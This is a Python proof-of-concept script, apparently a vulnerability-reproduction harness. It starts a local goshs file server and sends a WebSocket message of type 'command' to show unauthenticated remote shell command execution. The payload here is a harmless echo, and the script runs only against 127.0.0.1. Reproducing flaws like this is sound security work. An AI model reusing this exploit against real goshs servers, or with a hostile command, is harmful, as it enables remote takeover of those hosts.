#!/usr/bin/env python3
"""poc.py — drive the goshs file-server binary and prove, via its realtime
websocket channel, that a remote client can cause a security-relevant
server-side action (arbitrary shell command execution) that is observable in
the broadcast protocol transcript.

Standard library only. The trigger input is constructed dynamically at run
time; no payload file is read from disk and no external service is used.

Usage:
    python3 poc.py --binary /path/to/goshs [--json-out result.json] [--timeout 25]
"""

import argparse
import base64
import hashlib
import json
import os
import secrets
import shutil
import signal as signal_mod
import socket
import struct
import subprocess
import sys
import tempfile
import time

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
MAX_LOG = 20000  # truncate raw stdout/stderr to this many characters


# --------------------------------------------------------------------------
# WebSocket (RFC 6455) client — client frames are masked, server frames are not.
# --------------------------------------------------------------------------

class WebSocket:
    def __init__(self, host, port, timeout=10.0):
        self.host = host
        self.port = port
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self._buf = b""

        key = base64.b64encode(os.urandom(16)).decode()
        request = (
            "GET /?ws HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        try:
            self.sock.sendall(request.encode())
        except OSError as exc:
            raise RuntimeError(f"failed to send websocket upgrade: {exc}")

        # Read the handshake response headers (and keep any trailing bytes).
        response = b""
        while b"\r\n\r\n" not in response:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise RuntimeError("server closed connection during websocket upgrade")
            response += chunk
        header, _, trailing = response.partition(b"\r\n\r\n")
        self._buf = trailing

        status_line = header.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        if " 101 " not in status_line:
            raise RuntimeError(f"websocket upgrade rejected: {status_line!r}")

        expected = base64.b64encode(
            hashlib.sha1((key + WS_GUID).encode()).digest()
        ).decode()
        for line in header.split(b"\r\n")[1:]:
            name, _, value = line.partition(b":")
            if name.strip().lower() == b"sec-websocket-accept":
                if value.strip().decode("latin-1") != expected:
                    raise RuntimeError("websocket accept key mismatch")

    def _recv_exact(self, n):
        while len(self._buf) < n:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("websocket connection closed")
            self._buf += chunk
        out = self._buf[:n]
        self._buf = self._buf[n:]
        return out

    def recv_frame(self):
        head = self._recv_exact(2)
        opcode = head[0] & 0x0F
        masked = head[1] & 0x80
        length = head[1] & 0x7F
        if length == 126:
            length = struct.unpack(">H", self._recv_exact(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", self._recv_exact(8))[0]
        mask = self._recv_exact(4) if masked else None
        payload = self._recv_exact(length)
        if mask:
            payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        return opcode, payload

    def send_frame(self, opcode, payload):
        mask = os.urandom(4)
        length = len(payload)
        header = bytearray([0x80 | opcode])
        if length < 126:
            header.append(0x80 | length)
        elif length < 65536:
            header.append(0x80 | 126)
            header += struct.pack(">H", length)
        else:
            header.append(0x80 | 127)
            header += struct.pack(">Q", length)
        header += mask
        masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + masked)

    def send_text(self, text):
        self.send_frame(0x1, text.encode("utf-8"))

    def send_close(self):
        try:
            self.send_frame(0x8, struct.pack(">H", 1000))
        except OSError:
            pass

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


def collect_frames(ws, max_wait=2.0, idle=0.5):
    """Collect server frames until the channel has been quiet for `idle`
    seconds (with at least one frame) or `max_wait` elapses."""
    frames = []
    ws.sock.settimeout(0.2)
    start = time.time()
    last = start
    while True:
        now = time.time()
        if now - start > max_wait:
            break
        if frames and (now - last) > idle:
            break
        try:
            opcode, payload = ws.recv_frame()
        except socket.timeout:
            continue
        except (EOFError, OSError):
            break
        frames.append((opcode, payload))
        last = time.time()
        if opcode == 0x8:  # close
            break
        if opcode == 0x9:  # ping -> pong
            ws.send_frame(0xA, payload)
    return frames


# --------------------------------------------------------------------------
# Process helpers.
# --------------------------------------------------------------------------

def free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def wait_http(port, deadline):
    """Wait until a GET to the server returns an HTTP status line."""
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", port), timeout=1.0)
            s.sendall(b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
            s.settimeout(1.0)
            data = b""
            while len(data) < 16:
                chunk = s.recv(16 - len(data))
                if not chunk:
                    break
                data += chunk
            s.close()
            if data.startswith(b"HTTP/1."):
                return True
        except OSError:
            pass
        time.sleep(0.1)
    return False


def stop_server(proc):
    if proc is None or proc.poll() is not None:
        return
    try:
        proc.terminate()
    except OSError:
        pass
    try:
        proc.wait(timeout=3.0)
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except OSError:
            pass
        try:
            proc.wait(timeout=3.0)
        except subprocess.TimeoutExpired:
            pass


def signal_name(number):
    try:
        return signal_mod.Signals(number).name
    except (ValueError, AttributeError):
        return str(number)


def trunc(text):
    if text is None:
        return ""
    if len(text) > MAX_LOG:
        return text[:MAX_LOG] + "\n...[truncated]"
    return text


# --------------------------------------------------------------------------
# Main run.
# --------------------------------------------------------------------------

def run(binary, timeout):
    start = time.time()
    port = free_port()
    webroot = tempfile.mkdtemp(prefix="goshs-poc-")
    command = [binary, "-i", "127.0.0.1", "-p", str(port), "-d", webroot]
    try:
        return _execute(binary, command, port, webroot, timeout, start)
    finally:
        shutil.rmtree(webroot, ignore_errors=True)


def _execute(binary, command, port, webroot, timeout, start):
    timed_out = False

    # A couple of harmless files so the webroot is non-empty.
    try:
        with open(os.path.join(webroot, "index.html"), "w") as fh:
            fh.write("<!doctype html><title>poc</title>poc webroot\n")
        with open(os.path.join(webroot, "note.txt"), "w") as fh:
            fh.write("poc note\n")
    except OSError as exc:
        return _result(binary, command, port, webroot, 0, None, False,
                       "", str(exc), {}, error="failed to prepare webroot: %s" % exc)

    # Dead loopback proxy so the startup update check fails fast instead of
    # blocking on the network.
    env = os.environ.copy()
    for key in ("HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"):
        env[key] = "http://127.0.0.1:9"

    transcript = []
    proc = None
    returncode = 0
    sig = None
    stdout = ""
    stderr = ""
    error = None

    try:
        try:
            proc = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env
            )
        except (OSError, ValueError) as exc:
            return _result(binary, command, port, webroot, 0, None, False,
                           "", str(exc), {}, error="failed to start binary: %s" % exc)

        if not wait_http(port, start + timeout):
            if proc.poll() is not None:
                rc = proc.poll()
                out, err = proc.communicate(timeout=5)
                return _result(binary, command, port, webroot, rc, None, False,
                               out, err, transcript,
                               error="server exited during startup (returncode=%s)" % rc)
            stop_server(proc)
            out, err = proc.communicate(timeout=5)
            timed_out = True
            return _result(binary, command, port, webroot,
                           proc.returncode if proc.returncode is not None else 0,
                           None, timed_out, out, err, transcript,
                           error="server did not become ready within timeout")

        ws = None
        try:
            try:
                ws = WebSocket("127.0.0.1", port, timeout=10.0)
            except Exception as exc:
                stop_server(proc)
                out, err = proc.communicate(timeout=5)
                return _result(binary, command, port, webroot,
                               proc.returncode if proc.returncode is not None else 0,
                               None, False, out, err, transcript,
                               error="websocket upgrade failed: %s" % exc)

            # Dynamically construct the trigger input for this run.
            nonce = secrets.token_hex(8)
            trigger_cmd = "echo GOSHS_POC_" + nonce
            messages = [
                {"type": "command", "content": trigger_cmd},
                {"type": "newEntry", "content": "poc-entry-" + nonce},
            ]

            for msg in messages:
                raw = json.dumps(msg, separators=(",", ":"))
                transcript.append("C> " + raw)
                ws.send_text(raw)
                for opcode, payload in collect_frames(ws):
                    if opcode == 0x1:
                        transcript.append("S< " + payload.decode("utf-8", "replace"))
                    elif opcode == 0x8:
                        transcript.append("S< [close]")

            ws.send_close()
        finally:
            if ws is not None:
                ws.close()

    except Exception as exc:  # unexpected internal failure
        error = "internal error: %r" % (exc,)
        stop_server(proc)
    finally:
        stop_server(proc)

    # Collect the raw server output and finalise the exit status.
    if proc is not None:
        try:
            out, err = proc.communicate(timeout=5)
        except (subprocess.TimeoutExpired, OSError):
            out, err = b"", b""
        stdout = out.decode("utf-8", "replace")
        stderr = err.decode("utf-8", "replace")
        rc = proc.returncode
        if rc is None:
            rc = 0
        returncode = rc
        if rc < 0:
            sig = signal_name(-rc)

    runtime_ms = int((time.time() - start) * 1000)
    return _result(binary, command, port, webroot, returncode, sig, timed_out,
                   stdout, stderr, transcript, error=error, runtime_ms=runtime_ms)


def _result(binary, command, port, webroot, returncode, sig, timed_out,
            stdout, stderr, transcript, error=None, runtime_ms=None):
    if runtime_ms is None:
        runtime_ms = 0
    if isinstance(stdout, bytes):
        stdout = stdout.decode("utf-8", "replace")
    if isinstance(stderr, bytes):
        stderr = stderr.decode("utf-8", "replace")
    value = "\n".join(transcript)
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": sig,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": trunc(stdout),
        "stderr": trunc(stderr),
        "observable": {
            "kind": "protocol_transcript",
            "value": value,
            "path": None,
        },
        "error": error,
    }


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Drive goshs and observe its websocket protocol for a "
                    "server-side action."
    )
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result to this file")
    parser.add_argument("--timeout", type=float, default=25.0,
                        help="per-run timeout in seconds (default: 25)")
    args = parser.parse_args(argv)

    result = run(args.binary, args.timeout)
    payload = json.dumps(result, indent=2)

    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(payload + "\n")
    else:
        sys.stdout.write(payload + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())